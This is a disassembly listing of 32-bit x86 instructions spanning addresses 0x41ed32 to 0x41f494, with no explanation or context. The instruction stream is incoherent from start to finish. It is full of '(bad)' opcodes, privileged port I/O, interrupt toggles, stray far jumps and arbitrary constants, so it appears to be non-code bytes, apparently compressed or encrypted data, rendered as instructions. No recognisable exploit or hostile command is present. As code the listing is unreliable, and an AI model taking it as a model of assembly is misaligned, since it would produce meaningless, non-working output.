  41ed32:	repnz loope 0x41eda6
  41ed35:	pop    ebp
  41ed36:	and    edi,DWORD PTR [eax]
  41ed38:	out    dx,al
  41ed39:	test   eax,0x47564308
  41ed3e:	or     al,0x9d
  41ed40:	jecxz  0x41ed73
  41ed42:	call   0x15c3fa94
  41ed47:	or     eax,0x6a5998b7
  41ed4c:	xchg   ebp,eax
  41ed4d:	dec    esi
  41ed4e:	in     al,0x79
  41ed50:	imul   DWORD PTR [esi+0x71]
  41ed53:	pop    eax
  41ed54:	je     0x41edb8
  41ed56:	add    BYTE PTR [ebp+eiz*2+0x326d7c7e],dl
  41ed5d:	mov    ecx,0x8b2c0b25
  41ed62:	sti    
  41ed63:	pop    esi
  41ed64:	imul   esi,ebp,0xffffffc8
  41ed67:	out    0x25,al
  41ed69:	xchg   ebp,eax
  41ed6a:	mov    cl,bh
  41ed6c:	xor    ch,cl
  41ed6e:	sbb    ebx,ebx
  41ed70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed71:	clc    
  41ed72:	lods   al,BYTE PTR ds:[esi]
  41ed73:	outs   dx,DWORD PTR ds:[esi]
  41ed74:	(bad)  
  41ed75:	jecxz  0x41ed8e
  41ed77:	xchg   edx,eax
  41ed78:	imul   esi,ecx,0x21
  41ed7b:	mov    ah,0xf0
  41ed7d:	out    0x19,eax
  41ed7f:	into   
  41ed80:	dec    ebp
  41ed81:	inc    ebp
  41ed82:	pop    eax
  41ed83:	pop    esp
  41ed84:	fbld   TBYTE PTR [edi+0x10033e7d]
  41ed8a:	arpl   WORD PTR [eax+0x6c],bx
  41ed8d:	push   0xad38b5b8
  41ed92:	mov    esi,0x373109a4
  41ed97:	cmp    DWORD PTR [edi-0x36c403a],ebx
  41ed9d:	jnp    0x41ed36
  41ed9f:	inc    esp
  41eda0:	outs   dx,BYTE PTR ds:[esi]
  41eda1:	inc    edi
  41eda2:	ja     0x41edd9
  41eda4:	fisubr DWORD PTR [edx+0x6a8964d7]
  41edaa:	dec    ecx
  41edab:	fld    QWORD PTR [edx+0x6f]
  41edae:	leave  
  41edaf:	sti    
  41edb0:	push   DWORD PTR [ecx]
  41edb2:	jecxz  0x41ee18
  41edb4:	jnp    0x41ee08
  41edb6:	(bad)  
  41edb7:	int3   
  41edb8:	sbb    BYTE PTR [ecx+eax*8],dh
  41edbb:	mov    bh,BYTE PTR [eax+ecx*4-0x73]
  41edbf:	loope  0x41ee36
  41edc1:	outs   dx,BYTE PTR ds:[esi]
  41edc2:	mov    al,0x3b
  41edc4:	cmp    eax,0xb2893c58
  41edc9:	arpl   WORD PTR [ebx],cx
  41edcb:	mov    ebp,0x5336aa8f
  41edd0:	jg     0x41ee15
  41edd2:	dec    ecx
  41edd3:	xchg   edi,eax
  41edd4:	push   edx
  41edd5:	out    dx,eax
  41edd6:	add    DWORD PTR [ebx-0x37],0x6bfbe4d6
  41eddd:	sub    esi,ebp
  41eddf:	jp     0x41edb2
  41ede1:	sbb    DWORD PTR [edi-0x4dbbd314],edi
  41ede7:	add    BYTE PTR [edi],dh
  41ede9:	(bad)  
  41edea:	and    eax,0x8bf92937
  41edef:	xchg   DWORD PTR [ebx+0x25532204],edi
  41edf5:	cmc    
  41edf6:	cmp    al,0x34
  41edf8:	fadd   QWORD PTR [edx-0x6d55b07]
  41edfe:	adc    DWORD PTR [ebx+0x12],ebp
  41ee01:	sub    DWORD PTR [edi+0x29],ebx
  41ee04:	jg     0x41ee51
  41ee06:	fist   WORD PTR [ebx]
  41ee08:	or     ah,ah
  41ee0a:	dec    ebp
  41ee0b:	je     0x41ee7d
  41ee0d:	enter  0xc4fe,0xcf
  41ee11:	fadd   DWORD PTR [ebx]
  41ee13:	stc    
  41ee14:	addr16 loope 0x41ee82
  41ee17:	adc    al,bh
  41ee19:	pop    ecx
  41ee1a:	aad    0x10
  41ee1c:	(bad)  [esi+0xa89cc25]
  41ee22:	mov    es,ebx
  41ee24:	mov    ds:0x75fa01a9,al
  41ee29:	call   0xa438:0xb644ce37
  41ee30:	mov    esp,0x95541aa1
  41ee35:	clc    
  41ee36:	adc    BYTE PTR [esi+0x44],ch
  41ee39:	je     0x41ee21
  41ee3b:	lds    ecx,FWORD PTR [ebx-0x4f]
  41ee3e:	adc    eax,0x9bd0555d
  41ee43:	mov    ds:0x6e68309a,al
  41ee48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee49:	or     ch,BYTE PTR [edx]
  41ee4b:	dec    ebx
  41ee4c:	cmp    edi,esp
  41ee4e:	pop    esi
  41ee4f:	lods   al,BYTE PTR ds:[esi]
  41ee50:	mov    WORD PTR [ebp+0x3977b172],ds
  41ee56:	ret    0x7ee7
  41ee59:	jmp    0x8f84:0xafbc1fd9
  41ee60:	push   0x1
  41ee62:	mov    ebx,0xb2af6b09
  41ee67:	test   eax,0xa199c6a1
  41ee6c:	xchg   ebp,eax
  41ee6d:	(bad)  
  41ee6e:	out    dx,al
  41ee6f:	cmp    ah,BYTE PTR [esi]
  41ee71:	push   es
  41ee72:	xor    DWORD PTR [edx+ebx*2],0x8f214cd7
  41ee79:	pop    es
  41ee7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee7c:	cmp    al,0xad
  41ee7e:	push   cs
  41ee7f:	call   0x2ccd949c
  41ee84:	pushf  
  41ee85:	sub    al,0x59
  41ee87:	sub    dh,BYTE PTR [ecx-0x3d]
  41ee8a:	mov    al,0x2f
  41ee8c:	add    BYTE PTR [eax-0x4f],0x4a
  41ee90:	gs pusha 
  41ee92:	(bad)  
  41ee93:	pop    ss
  41ee94:	mov    esi,0x7b7b7457
  41ee99:	nop
  41ee9a:	xchg   edi,eax
  41ee9b:	(bad)  [ebp-0x71]
  41ee9e:	pop    esi
  41ee9f:	ja     0x41ee5d
  41eea1:	aam    0x54
  41eea3:	mov    ds:0xfea5e8b3,eax
  41eea8:	or     edi,eax
  41eeaa:	bound  edx,QWORD PTR [edx]
  41eeac:	mov    esi,0xc69923ad
  41eeb1:	lock inc edi
  41eeb3:	jp     0x41ee61
  41eeb5:	leave  
  41eeb6:	int3   
  41eeb7:	cmp    al,0x22
  41eeb9:	sar    DWORD PTR [edx-0x61e927f3],0x47
  41eec0:	ret    
  41eec1:	aaa    
  41eec2:	retf   0x7db4
  41eec5:	hlt    
  41eec6:	inc    edi
  41eec7:	adc    al,0xec
  41eec9:	pop    ecx
  41eeca:	jmp    0xdc4c:0xa0ad78dc
  41eed1:	in     eax,0x98
  41eed3:	rol    BYTE PTR [edx],cl
  41eed5:	dec    ebx
  41eed6:	adc    DWORD PTR [ecx-0xdd31439],edi
  41eedc:	pop    ebp
  41eedd:	sub    ecx,DWORD PTR [eax-0x23]
  41eee0:	jmp    FWORD PTR [edi]
  41eee2:	inc    ebp
  41eee3:	stc    
  41eee4:	mov    DWORD PTR [ecx],ebp
  41eee6:	idiv   DWORD PTR ds:0x1c94dcbb
  41eeec:	jns    0x41eefc
  41eeee:	pop    es
  41eeef:	retf   
  41eef0:	cmp    al,0xdf
  41eef2:	cld    
  41eef3:	xchg   ecx,eax
  41eef4:	(bad)  
  41eef6:	pop    edi
  41eef7:	jp     0x41ef55
  41eef9:	loope  0x41eeff
  41eefb:	jbe    0x41eed1
  41eefd:	gs xchg esp,edx
  41ef00:	dec    esp
  41ef01:	rcl    BYTE PTR [eax-0x2d6beda3],1
  41ef07:	dec    eax
  41ef08:	rcl    dh,0x7c
  41ef0b:	or     al,BYTE PTR [ebx+0x2ebd307c]
  41ef11:	repz mov ah,BYTE PTR [edx-0x58]
  41ef15:	or     DWORD PTR [edx+0x77],ebx
  41ef18:	jge    0x41eea1
  41ef1a:	test   DWORD PTR [ebx+ecx*1-0x50],esi
  41ef1e:	jne    0x41eefc
  41ef20:	retf   0x1e84
  41ef23:	rcl    BYTE PTR [edx+0x52],0xd3
  41ef27:	xor    eax,DWORD PTR [ecx-0x7067e144]
  41ef2d:	ret    
  41ef2e:	add    bh,ch
  41ef30:	xchg   ebx,eax
  41ef31:	imul   eax,edx,0xffffff82
  41ef34:	jmp    0xe8c2:0xb5f18353
  41ef3b:	lods   al,BYTE PTR ds:[esi]
  41ef3c:	jecxz  0x41ef3a
  41ef3e:	fs out 0x70,eax
  41ef41:	inc    edx
  41ef42:	sub    BYTE PTR [ecx+0x78],bl
  41ef45:	xlat   BYTE PTR ds:[ebx]
  41ef46:	add    al,0x88
  41ef48:	and    al,0xd3
  41ef4a:	mov    esi,0x20d0a04
  41ef4f:	xor    dl,BYTE PTR [edi-0x4f]
  41ef52:	(bad)  
  41ef53:	or     ch,bl
  41ef55:	es in  al,dx
  41ef57:	push   esp
  41ef58:	loop   0x41ef45
  41ef5a:	daa    
  41ef5b:	jmp    0x41efbf
  41ef5d:	pusha  
  41ef5e:	(bad)  
  41ef5f:	mov    dl,0x81
  41ef61:	adc    ebp,eax
  41ef63:	test   eax,0xf8745359
  41ef68:	mov    eax,0x824c78e7
  41ef6d:	in     eax,dx
  41ef6e:	sub    eax,0x592b4593
  41ef73:	ss repnz dec ecx
  41ef76:	pop    esp
  41ef77:	push   ecx
  41ef78:	hlt    
  41ef79:	jo     0x41ef08
  41ef7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef7c:	sbb    al,cl
  41ef7e:	pushf  
  41ef7f:	adc    edx,DWORD PTR [edx+edx*2+0x76]
  41ef83:	mov    esi,0x4ba3319d
  41ef88:	mov    ds,WORD PTR [edx+0x22]
  41ef8b:	sub    al,0xa9
  41ef8d:	in     eax,dx
  41ef8e:	mov    bl,0xde
  41ef90:	cmovne ebx,DWORD PTR [esi+esi*8]
  41ef94:	mov    ah,0x3
  41ef96:	dec    edi
  41ef97:	inc    ebp
  41ef98:	mov    ds:0xcdb022a2,eax
  41ef9d:	aam    0xf3
  41ef9f:	add    eax,0x33ec15f5
  41efa4:	push   edi
  41efa5:	cmp    ah,BYTE PTR [ebp+0x49462b50]
  41efab:	outs   dx,BYTE PTR ds:[esi]
  41efac:	shl    DWORD PTR [esp+eax*1+0x16f5797c],cl
  41efb3:	xlat   BYTE PTR ds:[ebx]
  41efb4:	or     DWORD PTR [ebx-0x3f3c39b2],0xe
  41efbb:	cmp    eax,DWORD PTR [eax-0x12da16a2]
  41efc1:	out    dx,al
  41efc2:	out    0x63,eax
  41efc4:	push   cs
  41efc5:	cmp    dl,cl
  41efc7:	xor    BYTE PTR [eax-0x40394f85],dh
  41efcd:	test   BYTE PTR [ebp+0x18],al
  41efd0:	(bad)  
  41efd1:	cmp    ebp,DWORD PTR [ecx]
  41efd3:	cli    
  41efd4:	test   eax,0x400766d
  41efd9:	inc    ebp
  41efda:	sub    al,0xee
  41efdc:	in     al,0x15
  41efde:	jmp    0xf8a2:0xcccac9f7
  41efe5:	scas   eax,DWORD PTR es:[edi]
  41efe6:	es pop ds
  41efe8:	icebp  
  41efe9:	ja     0x41efee
  41efeb:	push   ds
  41efec:	mov    WORD PTR [edx-0x611dd6],gs
  41eff2:	test   BYTE PTR [edx+0x2b],0x61
  41eff6:	add    DWORD PTR [ecx-0x38],edi
  41eff9:	les    edx,FWORD PTR ds:0x881e9fb9
  41efff:	pop    esi
  41f000:	xor    dh,al
  41f002:	xchg   ecx,eax
  41f003:	into   
  41f004:	push   edx
  41f005:	jmp    0x67a2:0x243ec5ea
  41f00c:	cmp    BYTE PTR [ebx+ecx*2],bh
  41f00f:	fsub   st(1),st
  41f011:	jo     0x41f021
  41f013:	mov    ch,0xf6
  41f015:	cmp    al,0x79
  41f017:	xchg   DWORD PTR [ebp+0x45],ebp
  41f01a:	cld    
  41f01b:	(bad)  
  41f01c:	fwait
  41f01d:	and    al,0x81
  41f01f:	or     ah,BYTE PTR [edi+0x6b]
  41f022:	or     DWORD PTR [ecx+0x50],0x87169948
  41f029:	sar    DWORD PTR [ebx+0x6c],cl
  41f02c:	scas   eax,DWORD PTR es:[edi]
  41f02d:	cmc    
  41f02e:	push   ebx
  41f02f:	test   eax,0x3599f137
  41f034:	ja     0x41f059
  41f036:	xchg   ebx,eax
  41f037:	mov    al,0x89
  41f039:	arpl   WORD PTR [eax+0x29],ax
  41f03c:	adc    al,0xd6
  41f03e:	jbe    0x41effc
  41f040:	adc    eax,0x22ef9328
  41f045:	mov    DWORD PTR [edx+0x2c],ebp
  41f048:	loopne 0x41efed
  41f04a:	ss (bad) 
  41f04c:	pushf  
  41f04d:	sbb    edi,esi
  41f04f:	dec    ebp
  41f050:	mov    ecx,0x5024f524
  41f055:	mov    BYTE PTR [edi-0x2],ah
  41f058:	cld    
  41f059:	or     ch,BYTE PTR [ebx+0x4c6b42de]
  41f05f:	mov    ch,0x2
  41f061:	sbb    BYTE PTR [edi],0xe6
  41f064:	(bad)  [eax+0x56]
  41f067:	js     0x41f03d
  41f069:	cwde   
  41f06a:	pop    esp
  41f06b:	add    BYTE PTR [esi-0x43],bh
  41f06e:	adc    ch,0x76
  41f071:	xor    edx,DWORD PTR [ebx]
  41f073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f074:	add    al,BYTE PTR [ebp+0x7d]
  41f077:	jnp    0x41f012
  41f079:	loop   0x41f056
  41f07b:	and    al,0xaf
  41f07d:	arpl   WORD PTR [ebp+0x10],bx
  41f080:	ins    DWORD PTR es:[edi],dx
  41f081:	int    0x43
  41f083:	into   
  41f084:	inc    esp
  41f085:	xlat   BYTE PTR ds:[ebx]
  41f086:	aad    0x42
  41f088:	(bad)  
  41f089:	mov    edi,0xf70b100f
  41f08e:	jl     0x41f0a3
  41f090:	xchg   DWORD PTR [edx+0x672b2d7d],edx
  41f096:	dec    ebx
  41f097:	push   0x7a4aac28
  41f09c:	sahf   
  41f09d:	mov    ds:0x273a7a85,eax
  41f0a2:	scas   eax,DWORD PTR es:[edi]
  41f0a3:	(bad)  
  41f0a4:	mov    edx,0xedd8c3a2
  41f0a9:	jns    0x41f0f1
  41f0ab:	push   ecx
  41f0ac:	inc    ecx
  41f0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ae:	mov    dh,bh
  41f0b0:	sub    ecx,ecx
  41f0b2:	sub    esp,DWORD PTR [edi+0x71]
  41f0b5:	sbb    esp,ebx
  41f0b7:	pop    esi
  41f0b8:	mov    ch,0xc1
  41f0ba:	(bad)  
  41f0bb:	outs   dx,DWORD PTR ds:[esi]
  41f0bc:	mov    ecx,0xb3609b3a
  41f0c1:	mov    eax,ds:0xcc360f90
  41f0c6:	mov    bh,0x1f
  41f0c8:	imul   ebp,esi,0xa333ea79
  41f0ce:	cld    
  41f0cf:	sub    BYTE PTR [ebp-0x1094ce7f],0xd0
  41f0d6:	ds mov esi,0xe4dc5182
  41f0dc:	aad    0xa9
  41f0de:	mov    ecx,0x3a7f5ab5
  41f0e3:	mov    dh,0x64
  41f0e5:	scas   eax,DWORD PTR es:[edi]
  41f0e6:	jo     0x41f0c8
  41f0e8:	fld    QWORD PTR [eax]
  41f0ea:	pop    ebp
  41f0eb:	leave  
  41f0ec:	fsub   DWORD PTR [esi]
  41f0ee:	popf   
  41f0ef:	add    al,BYTE PTR [eax+ecx*1+0x72066411]
  41f0f6:	outs   dx,BYTE PTR ds:[esi]
  41f0f7:	jecxz  0x41f147
  41f0f9:	mov    DWORD PTR [ebp-0x55],ebx
  41f0fc:	adc    ecx,DWORD PTR [ebp-0x27f8f740]
  41f102:	mov    dl,0x98
  41f104:	pusha  
  41f105:	xchg   edx,eax
  41f106:	xor    al,0x94
  41f108:	xor    ebp,ebx
  41f10a:	sub    dl,bh
  41f10c:	test   DWORD PTR [esp+esi*8],ebp
  41f10f:	mov    ds:0x7b38068f,eax
  41f114:	add    ah,BYTE PTR [eax]
  41f116:	(bad)  
  41f117:	mov    bh,0x88
  41f119:	jle    0x41f137
  41f11b:	xor    al,0x82
  41f11d:	nop
  41f11e:	xchg   ecx,ecx
  41f120:	sub    DWORD PTR [edx+0x2f],esi
  41f123:	xchg   ebx,eax
  41f124:	adc    DWORD PTR [esi],eax
  41f126:	out    dx,eax
  41f127:	push   edi
  41f128:	inc    eax
  41f129:	test   eax,0x231ca4de
  41f12e:	sbb    ecx,DWORD PTR [edi-0x1a]
  41f131:	dec    edi
  41f132:	mov    eax,ds:0x3d8fe34d
  41f137:	jne    0x41f1af
  41f139:	scas   al,BYTE PTR es:[edi]
  41f13a:	fild   DWORD PTR [edi-0x5a]
  41f13d:	fyl2x  
  41f13f:	pop    ecx
  41f140:	lods   al,BYTE PTR ds:[esi]
  41f141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f142:	mov    esp,0xc0cd67e4
  41f147:	and    cl,BYTE PTR [edx+ebx*1-0x8e36153]
  41f14e:	scas   eax,DWORD PTR es:[edi]
  41f14f:	sub    ecx,DWORD PTR [ecx+ecx*2-0x30f07f6d]
  41f156:	and    eax,0xc42750ed
  41f15b:	call   0x62a9:0xf4d785d0
  41f162:	(bad)  
  41f163:	and    al,0x2f
  41f165:	sub    al,0xbc
  41f167:	jecxz  0x41f1be
  41f169:	and    BYTE PTR [edi-0x18],ch
  41f16c:	imul   eax,DWORD PTR [ebx+ebp*1],0xffffff91
  41f170:	out    0x2b,eax
  41f172:	mov    ch,0xf7
  41f174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f175:	cmc    
  41f176:	test   DWORD PTR ds:0x53ccf44f,eax
  41f17c:	(bad)  
  41f17d:	pop    ebx
  41f17e:	sbb    al,0x8f
  41f180:	and    dh,bl
  41f182:	scas   al,BYTE PTR es:[edi]
  41f183:	jae    0x41f17e
  41f185:	mov    ebp,0xf9ae27c8
  41f18a:	(bad)  
  41f18c:	outs   dx,BYTE PTR ds:[esi]
  41f18d:	dec    esp
  41f18e:	cs mov dh,0xd7
  41f191:	stc    
  41f192:	pop    es
  41f193:	inc    edi
  41f194:	or     al,0x6a
  41f196:	and    DWORD PTR [ebp-0x6716293b],esp
  41f19c:	adc    eax,0x24f556f9
  41f1a1:	and    bl,al
  41f1a3:	lds    edx,FWORD PTR [eax-0x6e6e013a]
  41f1a9:	out    0xee,eax
  41f1ab:	or     BYTE PTR [ebx-0x879ad2b],cl
  41f1b1:	cdq    
  41f1b2:	retf   
  41f1b3:	push   es
  41f1b4:	inc    esp
  41f1b5:	fmul   QWORD PTR [edx+0x43140fd6]
  41f1bb:	leave  
  41f1bc:	int3   
  41f1bd:	dec    esp
  41f1be:	aas    
  41f1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1c0:	sub    bh,BYTE PTR [ecx-0x6e]
  41f1c3:	sbb    DWORD PTR [ebp+ebx*8-0x12bd4186],eax
  41f1ca:	rcl    BYTE PTR [edi-0x75],0xe9
  41f1ce:	loop   0x41f22b
  41f1d0:	mov    esi,0x3c3f9264
  41f1d5:	mov    ds:0x5a7f13be,eax
  41f1da:	das    
  41f1db:	push   ebp
  41f1dc:	(bad)  
  41f1dd:	es ret 
  41f1df:	dec    ebp
  41f1e0:	pop    ebp
  41f1e1:	push   eax
  41f1e2:	jecxz  0x41f22e
  41f1e4:	cs xchg esi,eax
  41f1e6:	popa   
  41f1e7:	faddp  st(7),st
  41f1e9:	stos   DWORD PTR es:[edi],eax
  41f1ea:	mov    ebp,eax
  41f1ec:	mov    ds:0x81451d1b,al
  41f1f1:	cs ret 0x909a
  41f1f5:	push   ss
  41f1f6:	adc    esi,DWORD PTR [ebx+0x25]
  41f1f9:	pop    edx
  41f1fa:	xor    BYTE PTR [edx],dh
  41f1fc:	loope  0x41f1b2
  41f1fe:	and    DWORD PTR [eax-0x2ad50ce8],esi
  41f204:	sub    al,ah
  41f206:	mov    dh,0x24
  41f208:	call   0xe8eb:0x9c1798c
  41f20f:	ja     0x41f20e
  41f211:	push   ebp
  41f212:	in     al,0x8f
  41f214:	mov    BYTE PTR ds:0x4cb18cab,bl
  41f21a:	push   ss
  41f21b:	cmovs  di,WORD PTR [ebx+ebp*2-0x58]
  41f221:	pop    ebp
  41f222:	fisttp QWORD PTR [ebx+eiz*2-0x16]
  41f226:	add    DWORD PTR [edi-0x6e424a65],0xffffffe6
  41f22d:	fsubr  QWORD PTR [ecx-0x3030fb41]
  41f233:	stos   DWORD PTR es:[edi],eax
  41f234:	inc    ebx
  41f235:	mov    ch,0x23
  41f237:	mov    edi,0x98d7f5bd
  41f23c:	in     al,dx
  41f23d:	push   ebx
  41f23e:	jl     0x41f1e4
  41f240:	pop    esi
  41f241:	pop    esi
  41f242:	(bad)  
  41f243:	push   ss
  41f244:	jnp    0x41f26b
  41f246:	outs   dx,BYTE PTR ds:[esi]
  41f247:	mov    ah,0x36
  41f249:	and    al,0x5
  41f24b:	jbe    0x41f2a3
  41f24d:	push   ecx
  41f24e:	jno    0x41f2cb
  41f250:	or     DWORD PTR ds:0x7542c4c6,ebx
  41f256:	fcom   QWORD PTR [edi]
  41f258:	iret   
  41f259:	push   eax
  41f25a:	in     eax,dx
  41f25b:	dec    edi
  41f25c:	push   0x3b05f49e
  41f261:	mov    cl,0x60
  41f263:	mov    esi,0x3171aca5
  41f268:	sti    
  41f269:	mov    edx,0x1f636d15
  41f26e:	dec    ebx
  41f26f:	jg     0x41f297
  41f271:	dec    ecx
  41f272:	push   esi
  41f273:	mov    edi,ebx
  41f275:	and    al,0xf6
  41f277:	pop    eax
  41f278:	imul   ebx,edi,0x78ed3ed1
  41f27e:	ja     0x41f243
  41f280:	pop    edx
  41f281:	or     edx,edx
  41f283:	arpl   WORD PTR [ebx-0x50da0396],si
  41f289:	jle    0x41f2bf
  41f28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f28c:	pop    ds
  41f28d:	add    DWORD PTR [ebx+ecx*2+0x24],0x72
  41f292:	pusha  
  41f293:	mov    edi,DWORD PTR [ecx-0x445912d6]
  41f299:	rcr    bh,cl
  41f29b:	je     0x41f30b
  41f29d:	jae    0x41f269
  41f29f:	mov    bh,0x76
  41f2a1:	mov    ecx,0xa99c8881
  41f2a6:	std    
  41f2a7:	sub    eax,edx
  41f2a9:	mov    WORD PTR [ecx+0x79],cs
  41f2ac:	sub    eax,0xc3436109
  41f2b1:	and    al,0x6b
  41f2b3:	das    
  41f2b4:	inc    ecx
  41f2b5:	(bad)  
  41f2b6:	fcom   QWORD PTR [esp+ecx*1-0xb]
  41f2ba:	push   cs
  41f2bb:	add    esi,ebx
  41f2bd:	push   edi
  41f2be:	mov    cl,bl
  41f2c0:	shl    DWORD PTR [ecx+0x69aff640],1
  41f2c6:	xchg   edi,eax
  41f2c7:	loop   0x41f265
  41f2c9:	adc    eax,0x8afb2503
  41f2ce:	and    eax,0x3375e6f9
  41f2d3:	mov    ebx,0xdb3761f
  41f2d8:	xor    eax,DWORD PTR [edi+ebx*1+0x25c9b8fb]
  41f2df:	ins    DWORD PTR es:[edi],dx
  41f2e0:	push   ebx
  41f2e1:	je     0x41f353
  41f2e3:	sbb    ebp,edx
  41f2e5:	arpl   WORD PTR [ebx],bx
  41f2e7:	pop    edx
  41f2e8:	ret    
  41f2e9:	push   ds
  41f2ea:	data16 mov ds:0x1a1e6caf,al
  41f2f0:	dec    ebp
  41f2f1:	mov    eax,0x320dd001
  41f2f6:	cmp    ebx,esi
  41f2f8:	mov    dl,0x42
  41f2fa:	icebp  
  41f2fb:	not    esp
  41f2fd:	scas   eax,DWORD PTR es:[edi]
  41f2fe:	in     eax,0x91
  41f300:	mov    al,0xdd
  41f302:	stc    
  41f303:	xchg   ebx,eax
  41f304:	cmp    al,0xae
  41f306:	push   es
  41f307:	xor    BYTE PTR [edi-0x6f4d18ef],bh
  41f30d:	inc    ebx
  41f30e:	out    dx,al
  41f30f:	pop    ebp
  41f310:	inc    esp
  41f311:	mov    edi,0x1ec92b64
  41f316:	jecxz  0x41f2a9
  41f318:	sti    
  41f319:	scas   eax,DWORD PTR es:[edi]
  41f31a:	jmp    0xf616:0xa30c621c
  41f321:	adc    BYTE PTR fs:[eax-0x79dd9505],0x39
  41f329:	mov    al,ds:0x1933d4af
  41f32e:	dec    ecx
  41f32f:	xchg   BYTE PTR [ecx-0x66ed005d],bl
  41f335:	std    
  41f336:	cs pop edi
  41f338:	retf   0x538
  41f33b:	mov    esi,0x73477db
  41f340:	jle    0x41f3a0
  41f342:	jl     0x41f3bc
  41f344:	leave  
  41f345:	inc    ecx
  41f346:	pop    edi
  41f347:	add    BYTE PTR [edi-0x65],bl
  41f34a:	pop    edx
  41f34b:	sbb    al,0xa5
  41f34d:	scas   eax,DWORD PTR es:[edi]
  41f34e:	jnp    0x41f32a
  41f350:	or     al,0xeb
  41f352:	mov    esp,0xe6149860
  41f357:	dec    eax
  41f358:	mov    edx,0x92aab6fa
  41f35d:	cmp    BYTE PTR [ebx+0x36],0x90
  41f361:	bswap  esi
  41f363:	imul   eax,DWORD PTR [ebx-0x25aeb536],0xd7e78c42
  41f36d:	and    ch,dl
  41f36f:	sbb    al,0xc6
  41f371:	xchg   ebp,eax
  41f372:	aam    0xc3
  41f374:	pop    edi
  41f375:	in     al,dx
  41f376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f377:	push   esi
  41f378:	(bad)  
  41f379:	imul   DWORD PTR [ecx]
  41f37b:	cmp    al,dh
  41f37d:	inc    ebx
  41f37e:	lods   al,BYTE PTR ds:[esi]
  41f37f:	sub    DWORD PTR [ebp-0x495ebe78],ebx
  41f385:	cli    
  41f386:	out    0xc9,al
  41f388:	push   edx
  41f389:	xchg   esi,ecx
  41f38b:	daa    
  41f38c:	cmp    al,0xb
  41f38e:	dec    ebp
  41f38f:	cmp    dl,BYTE PTR [ebx-0x3152fa9c]
  41f395:	lds    eax,FWORD PTR [ecx-0x4fc1a877]
  41f39b:	sbb    DWORD PTR [esi+0x31],esi
  41f39e:	hlt    
  41f39f:	mov    ebx,0xe8344eb0
  41f3a4:	not    BYTE PTR [edi+0x5d]
  41f3a7:	add    al,0x35
  41f3a9:	lock and cl,ch
  41f3ac:	cmc    
  41f3ad:	mov    ah,0x7d
  41f3af:	ins    BYTE PTR es:[edi],dx
  41f3b0:	les    ebp,FWORD PTR [ecx+eiz*1]
  41f3b3:	pop    ecx
  41f3b4:	out    dx,al
  41f3b5:	mov    ebp,0x7a35d9e1
  41f3ba:	mov    ch,BYTE PTR [eax]
  41f3bc:	test   BYTE PTR [eax-0x5ef0da73],al
  41f3c2:	jmp    DWORD PTR [ecx+0x32]
  41f3c5:	fcmovnu st,st(2)
  41f3c7:	jb     0x41f3de
  41f3c9:	int    0xbc
  41f3cb:	and    dh,0x86
  41f3ce:	jge    0x41f3dd
  41f3d0:	popa   
  41f3d1:	(bad)  
  41f3d2:	(bad)  
  41f3d3:	aaa    
  41f3d4:	leave  
  41f3d5:	ins    BYTE PTR es:[edi],dx
  41f3d6:	pop    ebp
  41f3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3d8:	fisttp DWORD PTR [edi-0x6cd53718]
  41f3de:	and    DWORD PTR [esi-0x21decbd4],ecx
  41f3e4:	jae    0x41f404
  41f3e6:	add    al,0x43
  41f3e8:	sub    eax,0x3362ab2c
  41f3ed:	fsub   QWORD PTR [ebx]
  41f3ef:	dec    ecx
  41f3f0:	cmp    ch,BYTE PTR ds:0xf67d4d0
  41f3f6:	adc    al,0x72
  41f3f8:	stos   BYTE PTR es:[edi],al
  41f3f9:	(bad)  
  41f3fb:	mov    ss,WORD PTR ds:0xcd250a1
  41f401:	pop    esp
  41f402:	jne    0x41f3a1
  41f404:	shl    bh,0xef
  41f407:	cld    
  41f408:	mov    edi,0x15f5c6b8
  41f40d:	or     al,0x5f
  41f40f:	mov    ebx,0x8f47d21f
  41f414:	arpl   WORD PTR [edi+0xa9b4f8a],sp
  41f41a:	das    
  41f41b:	add    eax,0x8526237e
  41f420:	xor    al,0x96
  41f422:	push   ecx
  41f423:	retf   0x1d25
  41f426:	outs   dx,BYTE PTR ds:[esi]
  41f427:	xor    al,0x65
  41f429:	or     bl,BYTE PTR [edi-0xf]
  41f42c:	not    ch
  41f42e:	stos   BYTE PTR es:[edi],al
  41f42f:	mov    edx,0x4bd8ccef
  41f434:	mov    ss:0xab18ac4b,eax
  41f43a:	and    ch,BYTE PTR [edi-0x40]
  41f43d:	shr    DWORD PTR [eax],0x4f
  41f440:	pop    ebp
  41f441:	js     0x41f3d4
  41f443:	mov    ah,0x36
  41f445:	or     al,0x84
  41f447:	cdq    
  41f448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f449:	add    dl,ch
  41f44b:	xor    ebp,DWORD PTR [eax+0x2fd5d3ee]
  41f451:	mov    ch,0xe7
  41f453:	(bad)  
  41f455:	or     esp,ebx
  41f457:	and    esp,ebp
  41f459:	loop   0x41f449
  41f45b:	sub    al,0xd7
  41f45d:	icebp  
  41f45e:	dec    ebx
  41f45f:	test   cl,dl
  41f461:	popa   
  41f462:	gs aam 0x45
  41f465:	repnz inc edx
  41f467:	daa    
  41f468:	imul   edx,esi,0x49e08c0c
  41f46e:	(bad)  
  41f46f:	fnstcw WORD PTR [ebp+0x51]
  41f472:	jmp    0x41f47a
  41f474:	retf   0xbe9b
  41f477:	mov    WORD PTR [ebx],es
  41f479:	in     al,0xbf
  41f47b:	int    0x3d
  41f47d:	sub    BYTE PTR [esi-0x43],0x6b
  41f481:	cmp    eax,0xa77b84a4
  41f486:	sbb    cl,BYTE PTR ds:0x28dc5bd1
  41f48c:	pop    ds
  41f48d:	jno    0x41f474
  41f48f:	adc    BYTE PTR [ecx-0x4a],dl
  41f492:	pop    esi
  41f493:	in     al,dx
  41f494:	or     al,0x22
